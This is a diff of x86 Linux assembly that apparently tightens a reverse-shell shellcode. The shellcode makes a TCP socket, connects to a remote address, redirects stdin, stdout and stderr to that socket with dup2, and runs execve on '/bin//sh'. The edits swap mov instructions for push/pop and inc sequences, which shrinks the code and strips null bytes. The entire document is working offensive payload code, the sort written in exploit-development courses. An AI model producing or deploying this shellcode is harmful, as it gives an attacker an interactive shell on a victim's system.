@@ -6,15 +6,21 @@ _start:
 ;###socket###
 ;socket(AF_INET , SOCK_STREAM , 0);
 
-xor eax, eax
-mov al, 0x66 ;socketcall
+;xor eax, eax
+;mov al, 0x66 ;socketcall
+push byte 0x66
+pop eax
+
 xor ebx, ebx
-mov bl, 0x01 ;socket function
 
 ;push the list of arguments onto the stack
-push 0x00 ;PROT
-push 0x01 ;SOCK_STREAM
-push 0x02 ;AF_INET
+push ebx ;ebx=0 (PROT)
+inc ebx
+push ebx ; ebx=1 (SOCK_STREAM)
+inc ebx
+push ebx ;ebx=2 (AF_INET)
+
+dec ebx ;ebx=1
 
 mov ecx, esp ;pass the pointer to the list of arguments to ecx
 
@@ -41,10 +47,10 @@ mov esi, esp ;save the pointer to the struct in esi
 
 ; connect syscall
 ;int connect(int socket, struct sockaddr *foreignAddress, unsigned int addressLength)
-xor eax, eax
-mov eax, 0x66 ; socketcall
-xor ebx, ebx
-mov ebx, 0x03 ; connect
+push byte 0x66
+pop eax ; socketcall
+push byte 0x03
+pop ebx ; connect
 
 push 0x10 ; addressLength=16bytes. short+short+8+long=2+2+8+4=16
 push esi ; address of the struct 
@@ -58,25 +64,29 @@ int 0x80
 ;dup2(sock, 1);
 ;dup2(sock, 2);
 
-mov eax, 0x3f ;dup2
-mov ecx, 0x0
+push byte 0x3f;dup2
+pop eax
 mov ebx, edi
+xor ecx, ecx
 
 int 0x80
 
-mov eax, 0x3f ;dup2
-mov ecx, 0x1
+push byte 0x3f;dup2
+pop eax
+push byte 0x1
+pop ecx
 
 int 0x80
 
-mov eax, 0x3f ;dup2
-mov ecx, 0x2
+push byte 0x3f;dup2
+pop eax
+inc ecx
 
 int 0x80
 
 ;###execve###
-xor eax, eax
-mov al, 0x0b ;sys_execve
+push byte 0x0b
+pop eax ;sys_execve
 xor ebx, ebx 
 push ebx ;terminate string with \0
 push 0x68732f2f ;String "hs//"
